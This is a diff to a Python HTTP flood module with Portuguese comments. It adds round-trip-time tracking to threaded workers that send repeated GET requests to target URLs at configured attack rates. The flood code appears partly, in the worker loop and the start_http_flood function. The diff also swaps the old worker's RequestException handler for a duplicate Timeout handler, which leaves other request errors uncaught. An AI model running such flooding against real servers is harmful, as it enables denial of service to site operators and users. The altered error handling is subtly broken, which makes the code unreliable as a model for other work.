@@ -4,11 +4,14 @@ import time
 import threading
 import config # Para obter HTTP_ATTACK_REQUESTS_PER_SECOND_PER_ATTACKER, HTTP_ATTACK_NUM_ATTACKERS
 import random # Para uma alternativa de balanceamento
+import statistics
 
 # Variável global para controlar a execução dos threads de ataque
 attack_active = False
 attacker_threads = []
 threads = []
+rtt_measurements = []
+rtt_lock = threading.Lock()
 
 def http_request_worker(target_url, rps_per_this_worker):
     """
@@ -35,7 +38,7 @@ def http_request_worker(target_url, rps_per_this_worker):
     # print(f"  [Injector Worker {threading.get_ident()}] Started. Target: {target_url}, Configured RPS: {rps_per_this_worker:.2f}, Target Interval: {sleep_interval_seconds:.4f}s")
 
     while attack_active: # Loop é controlado pela flag global 'attack_active'
-        
+        start_time = time.monotonic()
         # Se RPS for 0, apenas dorme e continua checando 'attack_active'
         if rps_per_this_worker <= 0:
             time.sleep(0.1) # Dorme um pouco para não consumir CPU em idle e checa 'attack_active'
@@ -49,6 +52,11 @@ def http_request_worker(target_url, rps_per_this_worker):
             response = session.get(target_url, timeout=config.HTTP_REQUEST_TIMEOUT_SECONDS) 
             
             if response.status_code == 200:
+                end_time = time.monotonic()
+                rtt = (end_time - start_time) * 1000  # em milissegundos
+                with rtt_lock:
+                    rtt_measurements.append(rtt)
+
                 worker_request_count += 1
             else:
                 # Logar status code diferente de 200 como um erro ou apenas uma observação
@@ -86,6 +94,12 @@ def http_request_worker(target_url, rps_per_this_worker):
     # with global_stats_lock:
     #     global_total_requests_summary += worker_request_count
     #     global_total_errors_summary += worker_error_count
+
+def get_average_rtt_attack_ms():
+    with rtt_lock:
+        if not rtt_measurements:
+            return 0.0
+        return statistics.mean(rtt_measurements)
 
 
 def start_http_flood(target_urls, rps_per_worker, num_attackers):
@@ -237,11 +251,12 @@ def http_request_worker_OLD(target_url, rps_per_worker):
                 print(f"  [Injector Worker {threading.get_ident()}] Target: {target_url}, Status: {response.status_code}")
                 errors += 1
         except requests.exceptions.Timeout:
-	        print(f"  [Injector Worker {threading.get_ident()}] Target: {target_url}, Timeout error") # Descomente para depurar timeouts
-	        errors += 1
-        except requests.exceptions.RequestException as e:
-                print(f"  [Injector Worker {threading.get_ident()}] Target: {target_url}, Request error: {e}") # Descomente para depurar outros erros
-                errors += 1
+            print(f"  [Injector Worker {threading.get_ident()}] Target: {target_url}, Timeout error") # Descomente para depurar timeouts
+            errors += 1
+        except requests.exceptions.Timeout:
+            print(f"  [Injector Worker {threading.get_ident()}] Target: {target_url}, Timeout error")  # Descomente para depurar timeouts
+            errors += 1
+
             
  # OLD STUFF           
  #           response = session.get(target_url, timeout=2) # Timeout de 2 segundos
